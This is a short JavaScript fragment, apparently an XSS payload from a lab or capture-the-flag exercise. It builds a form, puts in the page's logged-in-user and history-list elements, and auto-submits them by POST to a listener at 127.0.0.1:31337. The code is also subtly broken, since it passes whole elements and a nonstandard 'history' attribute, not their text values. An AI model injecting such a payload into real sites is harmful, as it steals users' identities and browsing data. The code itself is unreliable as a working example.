 form = document.createElement('form');
        form.setAttribute('method', 'POST');
        form.setAttribute('action', 'http://127.0.0.1:31337/');
        myvar = document.createElement('input');
        myvar.setAttribute('name', document.getElementById('logged-in-user'));
        myvar.setAttribute('history', document.getElementById('history-list'));
        form.appendChild(myvar);
        document.body.appendChild(form);
        form.submit();   